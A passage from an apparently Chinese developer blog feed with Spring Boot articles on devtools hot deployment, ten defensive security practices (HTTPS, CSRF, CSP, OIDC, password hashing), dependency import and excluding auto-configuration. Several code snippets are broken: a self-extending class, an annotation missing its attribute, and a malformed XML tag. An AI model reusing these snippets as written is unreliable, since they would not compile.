        <content type="html"><![CDATA[<p>在Spring Boot实现代码热部署是一件很简单的事情，代码的修改可以自动部署并重新热启动项目。</p><h2 id="引用devtools依赖"><a href="#引用devtools依赖" class="headerlink" title="引用devtools依赖"></a>引用devtools依赖</h2><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;spring-boot-devtools&lt;&#x2F;artifactId&gt;    &lt;optional&gt;true&lt;&#x2F;optional&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样，当修改一个java类时就会热更新。</p><h2 id="自定义配置热部署"><a href="#自定义配置热部署" class="headerlink" title="自定义配置热部署"></a>自定义配置热部署</h2><p>以下配置用于自定义配置热部署，可以不设置。</p><pre class="line-numbers language-none"><code class="language-none"># 热部署开关，false即不启用热部署spring.devtools.restart.enabled: true# 指定热部署的目录#spring.devtools.restart.additional-paths: src&#x2F;main&#x2F;java# 指定目录不更新spring.devtools.restart.exclude: test&#x2F;**<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Intellij-Idea修改"><a href="#Intellij-Idea修改" class="headerlink" title="Intellij Idea修改"></a>Intellij Idea修改</h2><p>如果是idea，需要改以下两个地方：</p><p>1、勾上自动编译或者手动重新编译</p><blockquote><p>File &gt; Settings &gt; Compiler-Build Project automatically</p></blockquote><p>2、注册</p><blockquote><p>ctrl + shift + alt + &#x2F; &gt; Registry &gt; 勾选Compiler autoMake allow when app running</p></blockquote><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>1、生产环境devtools将被禁用，如java -jar方式或者自定义的类加载器等都会识别为生产环境。</p><p>2、打包应用默认不会包含devtools，除非你禁用SpringBoot Maven插件的<code>excludeDevtools</code>属性。</p><p>3、Thymeleaf无需配置<code>spring.thymeleaf.cache: false</code>，devtools默认会自动设置，<a href="https://github.com/spring-projects/spring-boot/blob/v1.5.7.RELEASE/spring-boot-devtools/src/main/java/org/springframework/boot/devtools/env/DevToolsPropertyDefaultsPostProcessor.java">点击</a>参考完整属性。</p><p>下面是devtools自动配置的部分源码：</p><pre class="line-numbers language-none"><code class="language-none">@Order(Ordered.LOWEST_PRECEDENCE)public class DevToolsPropertyDefaultsPostProcessor implements EnvironmentPostProcessor &#123;private static final Map&lt;String, Object&gt; PROPERTIES;static &#123;Map&lt;String, Object&gt; properties &#x3D; new HashMap&lt;String, Object&gt;();properties.put(&quot;spring.thymeleaf.cache&quot;, &quot;false&quot;);properties.put(&quot;spring.freemarker.cache&quot;, &quot;false&quot;);properties.put(&quot;spring.groovy.template.cache&quot;, &quot;false&quot;);properties.put(&quot;spring.mustache.cache&quot;, &quot;false&quot;);properties.put(&quot;server.session.persistent&quot;, &quot;true&quot;);properties.put(&quot;spring.h2.console.enabled&quot;, &quot;true&quot;);properties.put(&quot;spring.resources.cache-period&quot;, &quot;0&quot;);properties.put(&quot;spring.resources.chain.cache&quot;, &quot;false&quot;);properties.put(&quot;spring.template.provider.cache&quot;, &quot;false&quot;);properties.put(&quot;spring.mvc.log-resolved-exception&quot;, &quot;true&quot;);properties.put(&quot;server.jsp-servlet.init-parameters.development&quot;, &quot;true&quot;);PROPERTIES &#x3D; Collections.unmodifiableMap(properties);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4、devtools会在windows资源管理器占用java进程，在开发工具里面杀不掉，只能手动kill掉，不然重启会选成端口重复绑定报错。</p><p>关于boot-devtools更多详细用法，<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/using-boot-devtools.html">点击</a>参考官方文档。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 应用 10 种保护绝佳方法</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%BA%94%E7%94%A8%2010%20%E7%A7%8D%E4%BF%9D%E6%8A%A4%E7%BB%9D%E4%BD%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%BA%94%E7%94%A8%2010%20%E7%A7%8D%E4%BF%9D%E6%8A%A4%E7%BB%9D%E4%BD%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>Spring Boot大大简化了Spring应用程序的开发。它的自动配置和启动依赖大大减少了开始一个应用所需的代码和配置量，如果你已经习惯了Spring和大量XML配置，Spring Boot无疑是一股清新的空气。</p><p>Spring Boot于2014年首次发布，自那以后发生了很多变化。安全性问题与代码质量和测试非常相似，已经日渐成为开发人员关心的问题，如果你是开发人员并且不关心安全性，那么也许认为一切理所当然。本文目的是介绍如何创建更安全的Spring Boot应用程序。</p><p>马特雷布尔与Simon Maple合作完成了这篇文章，他们都是为安全公司工作，热爱Java，并希望帮助开发人员创建更安全的应用程序。我们认为撰写这篇文章将是回馈社区的有趣方式。</p><h4 id="1-在生产中使用HTTPS"><a href="#1-在生产中使用HTTPS" class="headerlink" title="1.在生产中使用HTTPS"></a>1.在生产中使用HTTPS</h4><p>传输层安全性（TLS）是HTTPS的官方名称，你可能听说过它称为SSL（安全套接字层），SSL是已弃用的名称，TLS是一种加密协议，可通过计算机网络提供安全通信。其主要目标是确保计算机应用程序之间的隐私和数据完整性。</p><p>过去，TLS &#x2F; SSL证书很昂贵，而且HTTPS被认为很慢，现在机器变得更快，已经解决了性能问题，Let’s Encrypt提供免费的TLS证书,这两项发展改变了游戏，并使TLS成为主流。</p><p>截至2018年7月24日，Google Chrome 将HTTP网站标记为“不安全”。虽然这在网络社区引起了相当多的争议。知名安全研究员特洛伊亨特创建了一个为什么不适用HTTPS？跟踪不使用HTTPS的大型网站的网站。</p><p>Let’s Encrypt TLS证书可以自动化生成和更新，由于他们是免费的，所以没有理由不去做！Spring Boot Secured By Let’s Encrypt的加密是如何做到这一点的有用指南。</p><p>要在Spring Boot应用程序中强制使用HTTPS，您可以扩展WebSecurityConfigurerAdapter并要求安全连接。</p><pre class="line-numbers language-none"><code class="language-none">@Configurationpublic class WebSecurityConfigurerAdapter extends WebSecurityConfigurerAdapter &#123;    @Override    protected void configure(HttpSecurity http) throws Exception &#123;        http.requiresChannel().requiresSecure();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另一个重要的事情是使用HTTP严格传输安全性（HSTS）。HSTS是一种Web安全策略机制，可以保护网站免受协议降级攻击和cookie劫持。服务器使用名为Strict-Transport-Security的响应头字段将HSTS策略传送到浏览器。Spring Security默认发送此标头，以避免在开始时出现不必要的HTTP跃点，点击这里一分钟开启Tomcat https支持。</p><h4 id="2-使用Snyk检查你的依赖关系"><a href="#2-使用Snyk检查你的依赖关系" class="headerlink" title="2.使用Snyk检查你的依赖关系"></a>2.使用Snyk检查你的依赖关系</h4><p>你很可能不知道应用程序使用了多少直接依赖项，这通常是正确的，尽管依赖性构成了整个应用程序的大部分。攻击者越来越多地针对开源依赖项，因为它们的重用为恶意黑客提供了许多受害者，确保应用程序的整个依赖关系树中没有已知的漏洞非常重要。</p><p>Snyk测试你的应用程序构建包，标记那些已知漏洞的依赖项。它在仪表板在应用程序中使用的软件包中存在的漏洞列表。</p><p>此外，它还将建议升级的版本或提供补丁，并提供针对源代码存储库的拉取请求来修复您的安全问题。Snyk还确保在你的存储库上提交的任何拉取请求（通过webhooks）时都是通过自动测试的，以确保它们不会引入新的已知漏洞。</p><p>每天都会在现有项目和库中发现新的漏洞，因此监控和保护生产部署也很重要。Snyk拍摄快照并监控你的部署，以便在发现新漏洞时，你可以通过JIRA，slack或电子邮件自动收到通知，并创建拉取请求以提供新漏洞的升级和补丁。</p><p>Snyk可通过Web UI和CLI获得，因此您可以轻松地将其与CI环境集成，并将其配置为在存在严重性超出设定阈值的漏洞时中断构建。</p><p>你可以免费使用Snyk进行开源项目或使用有限数量的私有项目。</p><h4 id="3-升级到最新版本"><a href="#3-升级到最新版本" class="headerlink" title="3.升级到最新版本"></a>3.升级到最新版本</h4><p>定期升级应用程序中的依赖项有多种原因。安全性是让您有升级动力的最重要原因之一。该start.spring.io起始页面采用了最新的春季版本的软件包，以及依赖关系，在可能的情况。</p><p>基础架构升级通常不如依赖项升级具有破坏性，因为库作者对向后兼容性和版本之间的行为更改的敏感性各不相同。话虽如此，当你在配置中发现安全漏洞时，您有三种选择：升级，修补程序或忽略。</p><p>在对应用程序进行必要的更改以使用较新版本之后，就应用程序的整体运行状况而言，升级是最安全的。</p><h4 id="4-启用CSRF保护"><a href="#4-启用CSRF保护" class="headerlink" title="4.启用CSRF保护"></a>4.启用CSRF保护</h4><p>跨站点请求伪造(Cross-Site Request Forgery )是一种攻击，强制用户在他们当前登录的应用程序中执行不需要的操作。如果用户是普通用户，一个成功攻击可能涉及请求的状态更改，如转移资金或更改其电子邮件地址，如果用户具有提升管理员的权限，则CSRF攻击可能会危及整个应用程序。</p><p>Spring Security具有出色的CSRF支持，如果您正在使用Spring MVC的<a href="form:form">form:form</a>标签或Thymeleaf @EnableWebSecurity，默认情况下处于启用状态，CSRF令牌将自动添加为隐藏输入字段。</p><p>如果你使用的是像Angular或React这样的JavaScript框架，则需要配置CookieCsrfTokenRepository以便JavaScript可以读取cookie。</p><pre class="line-numbers language-none"><code class="language-none">@EnableWebSecuritypublic class WebSecurityConfig extends WebSecurityConfigurerAdapter &#123;    @Override    protected void configure(HttpSecurity http) throws Exception &#123;        http            .csrf()                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果你正在使用Angular，这就是你需要做的。如果您使用的是React，则需要读取XSRF-TOKENcookie并将其作为X-XSRF-TOKEN标题发回。</p><p>当请求通过HTTPS发生时，Spring Security会自动加入一个secure标识到XSRF-TOKENcookie 。Spring Security对于CSRF cookie不使用SameSite&#x3D;strict 的标志，但它在使用Spring Session或WebFlux会话处理时会使用，这对会话cookie有意义，因为它有助于识别用户，但是没有为CSRF cookie提供太多价值，因为CSRF令牌也需要在请求中。点击这里了解CSRF更多详情。</p><h4 id="5-使用内容安全策略防止XSS攻击"><a href="#5-使用内容安全策略防止XSS攻击" class="headerlink" title="5.使用内容安全策略防止XSS攻击"></a>5.使用内容安全策略防止XSS攻击</h4><p>内容安全策略（CSP）是一个增加的安全层，可帮助缓解XSS（跨站点脚本）和数据注入攻击。要启用它，你需要配置应用程序以返回Content-Security-Policy标题。你还可以在HTML页面中<meta http-equiv="Content-Security-Policy">使用标记。</p><p>Spring安全性默认提供了许多安全标头：</p><pre class="line-numbers language-none"><code class="language-none">Cache-Control: no-cache, no-store, max-age&#x3D;0, must-revalidatePragma: no-cacheExpires: 0X-Content-Type-Options: nosniffStrict-Transport-Security: max-age&#x3D;31536000 ; includeSubDomainsX-Frame-Options: DENYX-XSS-Protection: 1; mode&#x3D;block<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Spring Security * 默认情况下不添加 CSP。你可以使用以下配置在Spring Boot应用程序中启用CSP标头。</p><pre class="line-numbers language-none"><code class="language-none">@EnableWebSecuritypublic class WebSecurityConfig extends WebSecurityConfigurerAdapter &#123;    @Override    protected void configure(HttpSecurity http) throws Exception &#123;        http.headers()            .contentSecurityPolicy(&quot;script-src &#39;self&#39; https:&#x2F;&#x2F;trustedscripts.example.com; object-src https:&#x2F;&#x2F;trustedplugins.example.com; report-uri &#x2F;csp-report-endpoint&#x2F;&quot;);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>CSP是防止XSS攻击的良好防御，请记住，打开CSP能让CDN访问许多非常古老且易受攻击的JavaScript库，这意味着使用CDN不会为安全性增加太多价值。点击这里了解XSS更多详情。</p><p>你可以在securityheaders.com测试你的CSP标头是否有用。</p><h4 id="6-使用OpenID-Connect进行身份验证"><a href="#6-使用OpenID-Connect进行身份验证" class="headerlink" title="6.使用OpenID Connect进行身份验证"></a>6.使用OpenID Connect进行身份验证</h4><p>OAuth 2.0是行业标准的授权协议。它使用scope来定义授权用户可以执行的操作的权限。但是，OAuth 2.0不是身份验证协议，并且不提供有关经过身份验证的用户的信息。</p><p>OpenID Connect（OIDC）是一个OAuth 2.0扩展，提供用户信息，除了访问令牌之外，它还添加了ID令牌，以及&#x2F;userinfo可以从中获取其他信息的端点，它还添加了发现功能和动态客户端注册的端点。</p><p>如果使用OIDC进行身份验证，则无需担心如何存储用户、密码或对用户进行身份验证。相反，你可以使用身份提供商（IdP）为你执行此操作，你的IdP甚至可能提供多因素身份验证（MFA）等安全附加组件。</p><p>要了解如何在Spring Boot应用程序中使用OIDC，请参阅Spring Security 5.0和OIDC入门。要总结如何使用它，你需要向项目添加一些依赖项，然后在application.yml文件中配置一些属性。</p><pre class="line-numbers language-none"><code class="language-none">spring:  security:    oauth2:      client:        registration:          okta:            client-id: &#123;clientId&#125;            client-secret: &#123;clientSecret&#125;            scope: openid email profile        provider:          okta:            issuer-uri: https:&#x2F;&#x2F;&#123;yourOktaDomain&#125;&#x2F;oauth2&#x2F;default<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：issuer-uri仅在Spring Security 5.1中支持使用，Spring Security 5.1正在积极开发中并计划于2018年9月发布。</p><p>你可以使用像Keycloak这样的开源系统来设置自己的OIDC服务器。如果你不想在生产中维护自己的服务器，可以使用Okta的Developer API。</p><h4 id="7-管理密码？使用密码哈希！"><a href="#7-管理密码？使用密码哈希！" class="headerlink" title="7.管理密码？使用密码哈希！"></a>7.管理密码？使用密码哈希！</h4><p>以纯文本格式存储密码是最糟糕的事情之一。幸运的是，Spring Security默认情况下不允许使用纯文本密码。它还附带了一个加密模块，可用于对称加密，生成密钥和密码散列（也就是密码编码）。</p><p>PasswordEncoder 是Spring Security中密码哈希的主要接口，如下所示：</p><pre class="line-numbers language-none"><code class="language-none">public interface PasswordEncoder &#123;    String encode(String rawPassword);    boolean matches(String rawPassword, String encodedPassword);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Spring Security提供了几种实现，最受欢迎的是BCryptPasswordEncoder和Pbkdf2PasswordEncoder。</p><p>对于一般的密码管理，我们建议使用SCrypt或Argon2, SCrypt现在已经过时了（已经有一段时间了），并且有一个额外的复杂因素，BCrypt没有这个因素，这使得暴力破解变得加倍地困难。它由着名的密码学家&#x2F;安全人员（Colin Percival）编写，并且在几乎所有编程语言中都有很好的库，SCrypt也得到Latacora的认可。</p><p>Spring Security 5.1（即2018年9月下旬）将附带UserDetailsPasswordService API，允许您升级密码存储。</p><h4 id="8-安全地存储秘密"><a href="#8-安全地存储秘密" class="headerlink" title="8.安全地存储秘密"></a>8.安全地存储秘密</h4><p>应谨慎处理敏感信息，如密码，访问令牌等，你不能以纯文本形式传递，或者如果将它们保存在本地存储中。由于（GitHub）的历史已经一次又一次证明，开发人员并没有仔细考虑如何存储他们的秘密。</p><p>一个好的做法是将保密信息存储在保管库中，该保管库可用于存储，提供对应用程序可能使用的服务的访问权限，甚至生成凭据。HashiCorp的Vault使得存储机密变得很轻松，并提供了许多额外的服务。</p><p>如果您对此感兴趣，请务必花一些时间查看Spring Vault，它为HashiCorp Vault添加抽象，为客户提供基于Spring注释的访问，允许他们访问、存储和撤销机密而不会迷失在基础架构中。以下代码段显示了使用注释从Spring Vault中提取密码的方便程度。</p><pre class="line-numbers language-none"><code class="language-none">@Value(&quot;$&#123;password&#125;&quot;)String password;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="9-使用OWASP的ZAP测试您的应用程序"><a href="#9-使用OWASP的ZAP测试您的应用程序" class="headerlink" title="9.使用OWASP的ZAP测试您的应用程序"></a>9.使用OWASP的ZAP测试您的应用程序</h4><p>OWASP ZAP安全工具是针对在运行活动的应用程序进行渗透测试的代理。它是一个受欢迎的（超过4k星）免费的开源项目，托管在GitHub上。</p><p>OWASP ZAP用于查找漏洞的两种方法是Spider和Active Scan。</p><p>Spider工具以URL种子开头，它将访问并解析每个响应，识别超链接并将它们添加到列表中。然后，它将访问这些新找到的URL并以递归方式继续，为您的Web应用程序创建URL映射。</p><p>Active Scan工具将根据潜在漏洞列表自动测试你选择的目标。它提供了一个报告，显示Web应用程序可被利用的位置以及有关漏洞的详细信息。</p><h4 id="10-让你的安全团队进行代码审查"><a href="#10-让你的安全团队进行代码审查" class="headerlink" title="10.让你的安全团队进行代码审查"></a>10.让你的安全团队进行代码审查</h4><p>代码评审对任何高性能软件开发团队都至关重要。在Okta，我们所有的生产代码和官方开源项目都需要通过我们的专家安全团队进行分析，你的公司可能没有安全专家，但如果你正在处理敏感数据，也许你应该这样做！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 开启的2种方式</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%BC%80%E5%90%AF%E7%9A%842%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%BC%80%E5%90%AF%E7%9A%842%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring-Boot依赖"><a href="#Spring-Boot依赖" class="headerlink" title="Spring Boot依赖"></a>Spring Boot依赖</h2><p>使用Spring Boot很简单，先添加基础依赖包，有以下两种方式</p><h4 id="1-继承spring-boot-starter-parent项目"><a href="#1-继承spring-boot-starter-parent项目" class="headerlink" title="1. 继承spring-boot-starter-parent项目"></a>1. 继承spring-boot-starter-parent项目</h4><pre class="line-numbers language-none"><code class="language-none">&lt;parent&gt;    &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;spring-boot-starter-parent&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.5.6.RELEASE&lt;&#x2F;version&gt;&lt;&#x2F;parent&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-导入spring-boot-dependencies项目依赖"><a href="#2-导入spring-boot-dependencies项目依赖" class="headerlink" title="2. 导入spring-boot-dependencies项目依赖"></a>2. 导入spring-boot-dependencies项目依赖</h4><pre class="line-numbers language-none"><code class="language-none">&lt;dependencyManagement&gt;&lt;dependencies&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-dependencies&lt;&#x2F;artifactId&gt;&lt;version&gt;1.5.6.RELEASE&lt;&#x2F;version&gt;&lt;type&gt;pom&lt;&#x2F;type&gt;&lt;scope&gt;import&lt;&#x2F;scope&gt;&lt;&#x2F;dependency&gt;&lt;&#x2F;dependencyManagement&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Spring-Boot依赖注意点"><a href="#Spring-Boot依赖注意点" class="headerlink" title="Spring Boot依赖注意点"></a>Spring Boot依赖注意点</h2><h3 id="1-属性覆盖只对继承有效"><a href="#1-属性覆盖只对继承有效" class="headerlink" title="1. 属性覆盖只对继承有效"></a>1. 属性覆盖只对继承有效</h3><blockquote><p>This only works if your Maven project inherits (directly or indirectly) from spring-boot-dependencies. If you have added spring-boot-dependencies in your own dependencyManagement section with <scope>import</scope> you have to redefine the artifact yourself instead of overriding the property.</p></blockquote><p>Spring Boot依赖包里面的组件的版本都是和当前Spring Boot绑定的，如果要修改里面组件的版本，只需要添加如下属性覆盖即可，但这种方式只对继承有效，导入的方式无效。</p><pre class="line-numbers language-none"><code class="language-none">&lt;properties&gt;    &lt;slf4j.version&gt;1.7.25&lt;slf4j.version&gt;&lt;&#x2F;properties&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果导入的方式要实现版本的升级，达到上面的效果，这样也可以做到，把要升级的组件依赖放到Spring Boot之前。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependencyManagement&gt;    &lt;dependencies&gt;        <!-- Override Spring Data release train provided by Spring Boot -->        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.data&lt;&#x2F;groupId&gt;            &lt;artifactId&gt;spring-data-releasetrain&lt;&#x2F;artifactId&gt;            &lt;version&gt;Fowler-SR2&lt;&#x2F;version&gt;            &lt;scope&gt;import&lt;&#x2F;scope&gt;            &lt;type&gt;pom&lt;&#x2F;type&gt;        &lt;&#x2F;dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;            &lt;artifactId&gt;spring-boot-dependencies&lt;&#x2F;artifactId&gt;            &lt;version&gt;1.5.6.RELEASE&lt;&#x2F;version&gt;            &lt;type&gt;pom&lt;&#x2F;type&gt;            &lt;scope&gt;import&lt;&#x2F;scope&gt;        &lt;&#x2F;dependency&gt;    &lt;&#x2F;dependencies&gt;&lt;&#x2F;dependencyManagement&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>Each Spring Boot release is designed and tested against a specific set of third-party dependencies. Overriding versions may cause compatibility issues.</p></blockquote><p>需要注意，要修改Spring Boot的依赖组件版本可能会造成不兼容的问题。</p><h3 id="2-资源文件过滤问题"><a href="#2-资源文件过滤问题" class="headerlink" title="2. 资源文件过滤问题"></a>2. 资源文件过滤问题</h3><p>使用继承Spring Boot时，如果要使用Maven resource filter过滤资源文件时，资源文件里面的占位符为了使${}和Spring Boot区别开来，此时要用@...@包起来，不然无效。另外，@...@占位符在yaml文件编辑器中编译报错，所以使用继承方式有诸多问题，坑要慢慢趟。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 排除自动配置的 4 种方法，关键时刻很有用</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%8E%92%E9%99%A4%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E7%9A%84%204%20%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%8C%E5%85%B3%E9%94%AE%E6%97%B6%E5%88%BB%E5%BE%88%E6%9C%89%E7%94%A8/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%8E%92%E9%99%A4%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E7%9A%84%204%20%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%8C%E5%85%B3%E9%94%AE%E6%97%B6%E5%88%BB%E5%BE%88%E6%9C%89%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>Spring Boot 提供的自动配置非常强大，某些情况下，自动配置的功能可能不符合我们的需求，需要我们自定义配置，这个时候就需要排除&#x2F;禁用 Spring Boot 某些类的自动化配置了。</p><p>比如：数据源、邮件，这些都是提供了自动配置的，我们需要排除 Spring Boot 的自动化配置，交给我们自己来自定义，该如何做呢？</p><p>今天栈长给你介绍 4 种排除方式，总有一种能帮到你！</p><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p>使用 <code>@SpringBootApplication</code> 注解的时候，使用 exclude 属性进行排除指定的类：</p><pre class="line-numbers language-none"><code class="language-none">@SpringBootApplication(exclude &#x3D; &#123;DataSourceAutoConfiguration.class, MailSenderAutoConfiguration.class&#125;)public class Application &#123;    &#x2F;&#x2F; ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>自动配置类不在类路径下的时候，使用 excludeName 属性进行排除指定的类名全路径：</p><pre class="line-numbers language-none"><code class="language-none">@SpringBootApplication(excludeName &#x3D; &#123;&quot;org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration&quot;, &quot;org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration&quot;&#125;)public class Application &#123;    &#x2F;&#x2F; ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>单独使用 <code>@EnableAutoConfiguration</code> 注解的时候：</p><pre class="line-numbers language-none"><code class="language-none">@...@EnableAutoConfiguration(exclude &#x3D; &#123;DataSourceAutoConfiguration.class, MailSenderAutoConfiguration.class&#125;)public class Application &#123;    &#x2F;&#x2F; ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自动配置类不在类路径下的时候，使用 excludeName 属性进行排除指定的类名全路径：</p><pre class="line-numbers language-none"><code class="language-none">@...@EnableAutoConfiguration &#123;&quot;org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration&quot;, &quot;org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration&quot;&#125;)public class Application &#123;    &#x2F;&#x2F; ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h4><p>使用 Spring Cloud 和 <code>@SpringCloudApplication</code> 注解的时候：</p><pre class="line-numbers language-none"><code class="language-none">@...@EnableAutoConfiguration(exclude &#x3D; &#123;DataSourceAutoConfiguration.class, MailSenderAutoConfiguration.class&#125;)@SpringCloudApplicationpublic class Application &#123;    &#x2F;&#x2F; ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Spring Cloud 必须建立在 Spring Boot 应用之上，所以这个不用多解释了。</p><h4 id="方法4"><a href="#方法4" class="headerlink" title="方法4"></a>方法4</h4><p>终极方案，不管是 Spring Boot 还是 Spring Cloud 都可以搞定，在配置文件中指定参数 <code>spring.autoconfigure.exclude</code> 进行排除：</p><pre class="line-numbers language-none"><code class="language-none">spring.autoconfigure.exclude&#x3D;org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,\    org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者还可以这样写：</p><pre class="line-numbers language-none"><code class="language-none">spring.autoconfigure.exclude[0]&#x3D;org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfigurationspring.autoconfigure.exclude[1]&#x3D;org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果你用的是 yaml 配置文件，可以这么写：</p><pre class="line-numbers language-none"><code class="language-none">spring:       autoconfigure:    exclude:      - org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration      - org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>知道了这 4 种排除方法，我们使用 Spring Boot 的自动配置功能就游刃有余了，怎么样？都 get 到了不？建议转发+收藏，再置顶公众号，以后不迷路~</p><ul><li>Spring Boot 读取配置的几种方式</li><li>Spring Boot 如何做参数校验？</li><li>Spring Boot 最核心的 25 个注解！</li><li>Spring Boot 2.x 启动全过程源码分析</li><li>Spring Boot 2.x 新特性总结及迁移指南</li></ul><p><img src="http://img.javastack.cn/wx_search_javastack.png"></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 支持 HTTPS 如此简单，So easy</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%94%AF%E6%8C%81%20HTTPS%20%E5%A6%82%E6%AD%A4%E7%AE%80%E5%8D%95%EF%BC%8CSo%20easy/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E6%94%AF%E6%8C%81%20HTTPS%20%E5%A6%82%E6%AD%A4%E7%AE%80%E5%8D%95%EF%BC%8CSo%20easy/</url>
      
